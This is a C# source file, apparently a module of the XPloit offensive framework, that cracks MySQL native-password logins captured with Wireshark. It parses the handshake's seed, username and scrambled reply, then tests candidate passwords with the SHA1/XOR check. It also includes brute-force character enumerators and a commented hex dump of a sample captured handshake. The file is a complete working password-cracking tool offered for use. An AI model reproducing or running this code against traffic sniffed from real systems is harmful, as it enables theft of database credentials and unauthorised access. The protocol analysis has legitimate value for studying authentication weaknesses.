﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using XPloit.Core;
using XPloit.Core.Enums;
using XPloit.Core.Parsers;

namespace XPloit.Modules.Auxiliary.Local
{
    public class BruteForceMySQLWireshark : Payload, BruteForce.ICheckPassword
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Crack MySql sniffed with WireShark Credentials"; } }
        public override string Path { get { return "Payloads/Local/BruteForce"; } }
        public override string Name { get { return "BruteForceMySQLWireshark"; } }
        public override Reference[] References
        {
            get
            {
                return new Reference[] 
                {
                    new Reference(EReferenceType.URL, "https://github.com/twitter/mysql/blob/master/sql/password.c"),
                    new Reference(EReferenceType.TEXT, 
@"The new authentication is performed in following manner:
  SERVER:  public_seed=create_random_string()
           send(public_seed)
  CLIENT:  recv(public_seed)
           hash_stage1=sha1('password')
           hash_stage2=sha1(hash_stage1)
           reply=xor(hash_stage1, sha1(public_seed,hash_stage2)
           // this three steps are done in scramble() 
           send(reply)
     
  SERVER:  recv(reply)
           hash_stage1=xor(reply, sha1(public_seed,hash_stage2))
           candidate_hash2=sha1(hash_stage1)
           check(candidate_hash2==hash_stage2)
           // this three steps are done in check_scramble()")

                };
            }
        }
        #endregion

        #region Properties
        public string WireSharkTCPStreamFile { get; set; }
        #endregion

        public bool AllowMultipleOk { get { return false; } }
        public bool CheckPassword(string password)
        {
            byte[] current = codec.GetBytes(password);

            byte[] firstHash = shap.ComputeHash(current, 0, current.Length);
            byte[] secondHash = shap.ComputeHash(firstHash, 0, 20);

            Array.Copy(bseed, 0, input, 0, 20);
            Array.Copy(secondHash, 0, input, 20, 20);

            byte[] finalHash = shap.ComputeHash(input, 0, 40);
            for (int i = 0; i < 20; i++)
            {
                if ((byte)(finalHash[i] ^ firstHash[i]) != bhash[i]) return false;
                //if ((finalHash[i] ^ firstHash[i]) != ihash[i]) return false;
            }
            return true;
        }

        string Hash, Seed, DBUser;
        static byte[] bseed = null, bhash = null, input = new byte[40];
        //static int[] ihash = null;
        Encoding codec = Encoding.Default;
        static SHA1Managed shap = new SHA1Managed();

        public bool PreRun()
        {
            WireSharkTCPStreamHexDump dump = WireSharkTCPStreamHexDump.FromFile(WireSharkTCPStreamFile);
            crack(dump.Send[0].Data, dump.Receive[0].Data);

            string _sh = HexToString(Hash, true);
            string _seed = HexToString(Seed, true);
            bseed = codec.GetBytes(_seed);
            byte[] bhash_all = codec.GetBytes(_sh);
            if (bhash_all.Length != 21) return false;
            bhash = new byte[bhash_all.Length - 1];
            Array.Copy(bhash_all, 1, bhash, 0, bhash.Length);
            //ihash = new int[bhash.Length];
            //for (int x = 0; x < bhash.Length; x++) ihash[x] = bhash[x];

/*
    00000000  5b 00 00 00 0a 35 2e 35  2e 33 37 2d 30 75 62 75 [....5.5 .37-0ubu
    00000010  6e 74 75 30 2e 31 33 2e  31 30 2e 31 00 9b 54 00 ntu0.13. 10.1..T.
    00000020  00 5a 42 7b 64 63 43 64  4f 00 ff f7 08 02 00 0f .ZB{dcCd O.......
    00000030  80 15 00 00 00 00 00 00  00 00 00 00 3f 2d 61 25 ........ ....?-a%
    00000040  33 6d 4d 7a 40 6f 2e 35  00 6d 79 73 71 6c 5f 6e 3mMz@o.5 .mysql_n
    00000050  61 74 69 76 65 5f 70 61  73 73 77 6f 72 64 00    ative_pa ssword.
00000000  4f 00 00 01 85 a6 1f 00  00 00 00 40 08 00 00 00 O....... ...@....
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
00000020  00 00 00 00 77 6b 6d 00  14 a6 ff 0e 5d 8d 02 94 ....wkm. ....]...
00000030  8e 2a 06 0d 76 36 59 d5  ca c8 16 61 67 6d 79 73 .*..v6Y. ...agmys
00000040  71 6c 5f 6e 61 74 69 76  65 5f 70 61 73 73 77 6f ql_nativ e_passwo
00000050  72 64 00                                         rd.
*/
            return true;
        }
        public void PostRun() { }

        public void crack(byte[] receive, byte[] send)
        {
            Hash = ""; Seed = ""; DBUser = "";
            if (receive == null) return;
            if (send == null) return;

            try
            {
                MemoryStream ms = new MemoryStream(receive);
                MySqlStream stream = new MySqlStream(ms, Encoding.Default);

                // read off the welcome packet and parse out it's values
                stream.OpenPacket();
                int protocol = stream.ReadByte();
                string versionString = stream.ReadString();
                DBVersion version = DBVersion.Parse(versionString);
                int threadId = stream.ReadInteger(4);
                string encryptionSeed = stream.ReadString();

                int serverCaps = 0;
                if (stream.HasMoreData) serverCaps = stream.ReadInteger(2);
                if (version.isAtLeast(4, 1, 1))
                {
                    /* New protocol with 16 bytes to describe server characteristics */
                    int serverCharSetIndex = stream.ReadInteger(1);

                    int serverStatus = stream.ReadInteger(2);
                    stream.SkipBytes(13);
                    string seedPart2 = stream.ReadString();
                    encryptionSeed += seedPart2;
                }
                stream.Close();
                ms.Close();
                ms.Dispose();

                if (version.isAtLeast(4, 1, 1))
                {
                    string msg = Encoding.Default.GetString(send);
                    int i = msg.IndexOf("\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
                    if (i != -1)
                    {
                        string user = msg.Remove(0, i + 23);
                        i = user.IndexOf('\0');
                        string hash1 = user.Remove(0, i + 1);
                        if (hash1 == "\0") hash1 = "";
                        user = user.Substring(0, i);
                        //CLIENT:  recv(public_seed)
                        //         hash_stage1=sha1("password")
                        //         hash_stage2=sha1(hash_stage1)
                        //         reply=xor(hash_stage1, sha1(public_seed,hash_stage2)
                        //         send(reply)
                        //SERVER:  recv(reply)
                        //         hash_stage1=xor(reply, sha1(public_seed,hash_stage2))
                        //         candidate_hash2=sha1(hash_stage1)
                        //         check(candidate_hash2==hash_stage2)                            
                        Seed = StringToHex(encryptionSeed, true);
                        Hash = StringToHex(hash1, true);
                        DBUser = user;
                    }
                }
                else
                {
                    throw (new Exception("MYSQL ERROR VERSION INCOMPATIBLE, MUST BE >4.1.1"));
                }
            }
            catch { }
        }

        static string HexToString(string str, bool separado)
        {
            if (string.IsNullOrEmpty(str)) return "";
            StringBuilder ss = new StringBuilder();
            if (separado)
            {
                foreach (string s in str.Split(':'))
                    ss.Append(System.Convert.ToChar(System.Convert.ToUInt32(s, 16)).ToString());
            }
            else
            {
                if (str.Length % 2 == 0) throw (new Exception("ERROR, CADENA INPAR"));
                for (int x = 0; x < str.Length; x += 2)
                    ss.Append(System.Convert.ToChar(System.Convert.ToUInt32(str.Substring(x, 2), 16)).ToString());
            }
            return ss.ToString();
        }
        static string StringToHex(string str, bool sep_puntos)
        {
            if (string.IsNullOrEmpty(str)) return "";
            StringBuilder s = new StringBuilder();
            bool p = true;
            foreach (char c in str)
            {
                int tmp = c;
                if (sep_puntos && !p) s.Append(":");
                s.Append(String.Format("{0:x2}", (uint)System.Convert.ToUInt32(tmp.ToString())));
                p = false;
            }
            return s.ToString();
        }

        #region MySQL
        struct DBVersion
        {
            private int major;
            private int minor;
            private int build;
            private string srcString;

            public DBVersion(string s, int major, int minor, int build)
            {
                this.major = major;
                this.minor = minor;
                this.build = build;
                srcString = s;
            }
            public int Major { get { return major; } }
            public int Minor { get { return minor; } }
            public int Build { get { return build; } }
            public static DBVersion Parse(string versionString)
            {
                int start = 0;
                int index = versionString.IndexOf('.', start);
                if (index == -1) throw new Exception("ERROR");
                string val = versionString.Substring(start, index - start).Trim();
                int major = Convert.ToInt32(val, System.Globalization.NumberFormatInfo.InvariantInfo);

                start = index + 1;
                index = versionString.IndexOf('.', start);
                if (index == -1) throw new Exception("ERROR");
                val = versionString.Substring(start, index - start).Trim();
                int minor = Convert.ToInt32(val, System.Globalization.NumberFormatInfo.InvariantInfo);

                start = index + 1;
                int i = start;
                while (i < versionString.Length && Char.IsDigit(versionString, i))
                    i++;
                val = versionString.Substring(start, i - start).Trim();
                int build = Convert.ToInt32(val, System.Globalization.NumberFormatInfo.InvariantInfo);

                return new DBVersion(versionString, major, minor, build);
            }
            public bool isAtLeast(int majorNum, int minorNum, int buildNum)
            {
                if (major > majorNum) return true;
                if (major == majorNum && minor > minorNum) return true;
                if (major == majorNum && minor == minorNum && build >= buildNum) return true;
                return false;
            }
            public override string ToString() { return srcString; }

        }
        class MySqlStream
        {
            private byte sequenceByte;
            private int peekByte;
            private Encoding encoding;
            private DBVersion version;

            private MemoryStream bufferStream;

            private int maxBlockSize;
            private ulong maxPacketSize;

            private Stream inStream;
            private ulong inLength;
            private ulong inPos;

            private Stream outStream;
            private ulong outLength;
            private ulong outPos;
            private bool isLastPacket;
            private byte[] byteBuffer;

            public MySqlStream(Encoding encoding)
            {
                // we have no idea what the real value is so we start off with the max value
                // The real value will be set in NativeDriver.Configure()
                maxPacketSize = ulong.MaxValue;

                // we default maxBlockSize to MaxValue since we will get the 'real' value in 
                // the authentication handshake and we know that value will not exceed 
                // true maxBlockSize prior to that.
                maxBlockSize = Int32.MaxValue;

                this.encoding = encoding;
                bufferStream = new MemoryStream();
                byteBuffer = new byte[1];
                peekByte = -1;
            }

            public MySqlStream(Stream baseStream, Encoding encoding/*bool compress*/)
                : this(encoding)
            {

                inStream = new BufferedStream(baseStream);
                outStream = new BufferedStream(baseStream);
                //if (compress)
                //{
                //    inStream = new CompressedStream(inStream);
                //    outStream = new CompressedStream(outStream);
                //}
            }

            public void Close()
            {
                inStream.Close();
                // no need to close outStream because closing
                // inStream closes the underlying network stream
                // for us.
            }

            #region Properties

            public bool IsLastPacket { get { return isLastPacket; } }
            public DBVersion Version { get { return version; } set { version = value; } }
            public Encoding Encoding { get { return encoding; } set { encoding = value; } }
            public MemoryStream InternalBuffer { get { return bufferStream; } }
            public byte SequenceByte { get { return sequenceByte; } set { sequenceByte = value; } }
            public bool HasMoreData
            {
                get
                {
                    return inLength > 0 &&
                             (inLength == (ulong)maxBlockSize || inPos < inLength);
                }
            }
            public int MaxBlockSize { get { return maxBlockSize; } set { maxBlockSize = value; } }
            public ulong MaxPacketSize { get { return maxPacketSize; } set { maxPacketSize = value; } }
            #endregion

            #region Packet methods

            /// <summary>
            /// OpenPacket is called by NativeDriver to start reading the next
            /// packet on the stream.
            /// </summary>
            public void OpenPacket()
            {
                if (HasMoreData)
                {
                    SkipBytes((int)(inLength - inPos));
                }
                // make sure we have read all the data from the previous packet
                //Debug.Assert(HasMoreData == false, "HasMoreData is true in OpenPacket");

                LoadPacket();

                int peek = PeekByte();
                if (peek == 0xff)
                {
                    ReadByte();  // read off the 0xff

                    int code = ReadInteger(2);
                    string msg = ReadString();
                    if (msg.StartsWith("#"))
                    {
                        msg.Substring(1, 5);  /* state code */
                        msg = msg.Substring(6);
                    }
                    throw new Exception(msg);
                }
                isLastPacket = (peek == 0xfe && (inLength < 9));
            }

            /// <summary>
            /// LoadPacket loads up and decodes the header of the incoming packet.
            /// </summary>
            public void LoadPacket()
            {
                int b1 = inStream.ReadByte();
                int b2 = inStream.ReadByte();
                int b3 = inStream.ReadByte();
                int seqByte = inStream.ReadByte();

                if (b1 == -1 || b2 == -1 || b3 == -1 || seqByte == -1) throw new Exception("ERROR");

                sequenceByte = (byte)++seqByte;
                inLength = (ulong)(b1 + (b2 << 8) + (b3 << 16));

                inPos = 0;
            }

            /// <summary>
            /// SkipPacket will read the remaining bytes of a packet into a small
            /// local buffer and discard them.
            /// </summary>
            public void SkipPacket()
            {
                byte[] tempBuf = new byte[1024];
                while (inPos < inLength)
                {
                    int toRead = (int)Math.Min((ulong)tempBuf.Length, (inLength - inPos));
                    Read(tempBuf, 0, toRead);
                }
            }

            public void SendEntirePacketDirectly(byte[] buffer, int count)
            {
                buffer[0] = (byte)(count & 0xff);
                buffer[1] = (byte)((count >> 8) & 0xff);
                buffer[2] = (byte)((count >> 16) & 0xff);
                buffer[3] = sequenceByte++;
                outStream.Write(buffer, 0, count + 4);
                outStream.Flush();
            }

            /// <summary>
            /// StartOutput is used to reset the write state of the stream.
            /// </summary>
            public void StartOutput(ulong length, bool resetSequence)
            {
                outLength = outPos = 0;
                if (length > 0)
                {
                    if (length > maxPacketSize) throw new Exception("ERROR");
                    outLength = length;
                }

                if (resetSequence)
                    sequenceByte = 0;
            }

            /// <summary>
            /// Writes out the header that is used at the start of a transmission
            /// and at the beginning of every packet when multipacket is used.
            /// </summary>
            private void WriteHeader()
            {
                int len = (int)Math.Min((outLength - outPos), (ulong)maxBlockSize);

                outStream.WriteByte((byte)(len & 0xff));
                outStream.WriteByte((byte)((len >> 8) & 0xff));
                outStream.WriteByte((byte)((len >> 16) & 0xff));
                outStream.WriteByte(sequenceByte++);
            }

            public void SendEmptyPacket()
            {
                outLength = 0;
                outPos = 0;
                WriteHeader();
                outStream.Flush();
            }

            #endregion

            #region Byte methods

            public int ReadNBytes()
            {
                byte c = (byte)ReadByte();
                if (c < 1 || c > 4) throw new Exception("EROR");
                return ReadInteger(c);
            }

            public void SkipBytes(int len)
            {
                while (len-- > 0)
                    ReadByte();
            }

            /// <summary>
            /// Reads the next byte from the incoming stream
            /// </summary>
            /// <returns></returns>
            public int ReadByte()
            {
                int b;
                if (peekByte != -1)
                {
                    b = PeekByte();
                    peekByte = -1;
                    inPos++;   // we only do this here since Read will also do it
                }
                else
                {
                    // we read the byte this way because we might cross over a 
                    // multipacket boundary
                    int cnt = Read(byteBuffer, 0, 1);
                    if (cnt <= 0)
                        return -1;
                    b = byteBuffer[0];
                }
                return b;
            }

            /// <summary>
            /// Reads a block of bytes from the input stream into the given buffer.
            /// </summary>
            /// <returns>The number of bytes read.</returns>
            public int Read(byte[] buffer, int offset, int count)
            {
                // we use asserts here because this is internal code
                // and we should be calling it correctly in all cases
                //Debug.Assert(buffer != null);
                //Debug.Assert(offset >= 0 &&
                //    (offset < buffer.Length || (offset == 0 && buffer.Length == 0)));
                //Debug.Assert(count >= 0);
                //Debug.Assert((offset + count) <= buffer.Length);

                int totalRead = 0;

                while (count > 0)
                {
                    // if we have peeked at a byte, then read it off first.
                    if (peekByte != -1)
                    {
                        buffer[offset++] = (byte)ReadByte();
                        count--;
                        totalRead++;
                        continue;
                    }

                    // check if we are done reading the current packet
                    if (inPos == inLength)
                    {
                        // if yes and this block is not max size, then we are done
                        if (inLength < (ulong)maxBlockSize)
                            return 0;

                        // the current block is maxBlockSize so we need to read
                        // in another block to continue
                        LoadPacket();
                    }

                    int lenToRead = Math.Min(count, (int)(inLength - inPos));
                    int read = inStream.Read(buffer, offset, lenToRead);

                    // we don't throw an exception here even though this probably
                    // indicates a broken connection.  We leave that to the 
                    // caller.
                    if (read == 0)
                        break;

                    count -= read;
                    offset += read;
                    totalRead += read;
                    inPos += (ulong)read;
                }

                return totalRead;
            }

            /// <summary>
            /// Peek at the next byte off the stream
            /// </summary>
            /// <returns>The next byte off the stream</returns>
            public int PeekByte()
            {
                if (peekByte == -1)
                {
                    peekByte = ReadByte();
                    // ReadByte will advance inPos so we need to back it up since
                    // we are not really reading the byte
                    inPos--;
                }
                return peekByte;
            }

            /// <summary>
            /// Writes a single byte to the output stream.
            /// </summary>
            public void WriteByte(byte value)
            {
                byteBuffer[0] = value;
                Write(byteBuffer, 0, 1);
            }

            public void Write(byte[] buffer, int offset, int count)
            {
                //Debug.Assert(buffer != null && offset >= 0 && count >= 0);

                // if we are buffering, then just write it to the buffer
                if (outLength == 0)
                {
                    bufferStream.Write(buffer, offset, count);
                    return;
                }

                // make sure the inputs to the method make sense
                //Debug.Assert(outLength > 0 && (outPos + (ulong)count) <= outLength);

                int pos = 0;
                // if we get here, we are not buffering.  
                // outLength is the total amount of data we are going to send
                // This means that multiple calls to write could be combined.
                while (count > 0)
                {
                    int cntToWrite = (int)Math.Min((outLength - outPos), (ulong)count);
                    cntToWrite = Math.Min(maxBlockSize - (int)(outPos % (ulong)maxBlockSize), cntToWrite);

                    // if we are at a block border, then we need to send a new header
                    if ((outPos % (ulong)maxBlockSize) == 0)
                        WriteHeader();

                    outStream.Write(buffer, pos, cntToWrite);

                    outPos += (ulong)cntToWrite;
                    pos += cntToWrite;
                    count -= cntToWrite;
                }
            }

            public void Write(byte[] buffer)
            {
                Write(buffer, 0, buffer.Length);
            }

            public void Flush()
            {
                if (outLength == 0)
                {
                    if (bufferStream.Length > 0)
                    {
                        byte[] bytes = bufferStream.GetBuffer();
                        StartOutput((ulong)bufferStream.Length, false);
                        Write(bytes, 0, (int)bufferStream.Length);
                    }
                    bufferStream.SetLength(0);
                    bufferStream.Position = 0;
                }

                outStream.Flush();
            }

            #endregion

            #region Integer methods

            public long ReadFieldLength()
            {
                byte c = (byte)ReadByte();

                switch (c)
                {
                    case 251: return -1;
                    case 252: return ReadInteger(2);
                    case 253: return ReadInteger(3);
                    case 254: return ReadInteger(8);
                    default: return c;
                }
            }

            public ulong ReadLong(int numbytes)
            {
                ulong val = 0;
                int raise = 1;
                for (int x = 0; x < numbytes; x++)
                {
                    int b = ReadByte();
                    val += (ulong)(b * raise);
                    raise *= 256;
                }
                return val;
            }

            public int ReadInteger(int numbytes)
            {
                return (int)ReadLong(numbytes);
            }

            /// <summary>
            /// WriteInteger
            /// </summary>
            /// <param name="v"></param>
            /// <param name="numbytes"></param>
            public void WriteInteger(long v, int numbytes)
            {
                long val = v;

                //Debug.Assert(numbytes > 0 && numbytes < 5);

                for (int x = 0; x < numbytes; x++)
                {
                    WriteByte((byte)(val & 0xff));
                    val >>= 8;
                }
            }

            public int ReadPackedInteger()
            {
                byte c = (byte)ReadByte();

                switch (c)
                {
                    case 251: return -1;
                    case 252: return ReadInteger(2);
                    case 253: return ReadInteger(3);
                    case 254: return ReadInteger(4);
                    default: return c;
                }
            }

            public void WriteLength(long length)
            {
                if (length < 251)
                    WriteByte((byte)length);
                else if (length < 65536L)
                {
                    WriteByte(252);
                    WriteInteger(length, 2);
                }
                else if (length < 16777216L)
                {
                    WriteByte(253);
                    WriteInteger(length, 3);
                }
                else
                {
                    WriteByte(254);
                    WriteInteger(length, 4);
                }
            }

            #endregion

            #region String methods

            public void WriteLenString(string s)
            {
                byte[] bytes = encoding.GetBytes(s);
                WriteLength(bytes.Length);
                Write(bytes, 0, bytes.Length);
            }

            public void WriteStringNoNull(string v)
            {
                byte[] bytes = encoding.GetBytes(v);
                Write(bytes, 0, bytes.Length);
            }

            public void WriteString(string v)
            {
                WriteStringNoNull(v);
                WriteByte(0);
            }

            public string ReadLenString()
            {
                long len = ReadPackedInteger();
                return ReadString(len);
            }

            public string ReadString(long length)
            {
                if (length == 0)
                    return String.Empty;
                byte[] buf = new byte[length];
                Read(buf, 0, (int)length);
                return encoding.GetString(buf, 0, buf.Length);
            }

            public string ReadString()
            {
                MemoryStream ms = new MemoryStream();

                int b = ReadByte();
                while (b != 0 && b != -1)
                {
                    ms.WriteByte((byte)b);
                    b = ReadByte();
                }

                return encoding.GetString(ms.GetBuffer(), 0, (int)ms.Length);
            }

            #endregion

        }
        class MatchChar
        {
            public static IEnumerable<char[]> GetAllMatches(string scurrent, char[] chars, int length)
            {
                int[] indexes = new int[length];
                char[] current = new char[length];
                int cl = chars.Length;

                if (!string.IsNullOrEmpty(scurrent) && current.Length == length)
                {
                    for (int i = 0; i < length; i++) current[i] = scurrent[0];
                }
                else for (int i = 0; i < length; i++) current[i] = chars[0];

                do { yield return current; }
                while (Increment(indexes, length - 1, current, chars, cl));
            }
            public static bool Increment(int[] indexes, int pos, char[] current, char[] chars, int cl)
            {
                while (pos >= 0)
                {
                    indexes[pos]++;
                    if (indexes[pos] < cl) { current[pos] = chars[indexes[pos]]; return true; }
                    indexes[pos] = 0;
                    current[pos] = chars[0];
                    pos--;
                }
                return false;
            }
        }
        class MatchByte
        {
            public static IEnumerable<byte[]> GetAllMatches(string scurrent, byte[] chars, int chars_length, int length)
            {
                int[] indexes = new int[length];
                byte[] current = new byte[length];

                if (!string.IsNullOrEmpty(scurrent))
                {
                    int lgc = scurrent.Length;
                    for (int i = 0; i < lgc; i++) current[i] = (byte)scurrent[i];
                }
                else for (int i = 0; i < length; i++) current[i] = chars[0];

                do { yield return current; }
                while (Increment(indexes, length - 1, current, chars, chars_length));
            }
            public static bool Increment(int[] indexes, int pos, byte[] current, byte[] chars, int cl)
            {
                while (pos >= 0)
                {
                    indexes[pos]++;
                    if (indexes[pos] < cl) { current[pos] = chars[indexes[pos]]; return true; }
                    indexes[pos] = 0;
                    current[pos] = chars[0];
                    pos--;
                }
                return false;
            }
        }
        #endregion
    }
}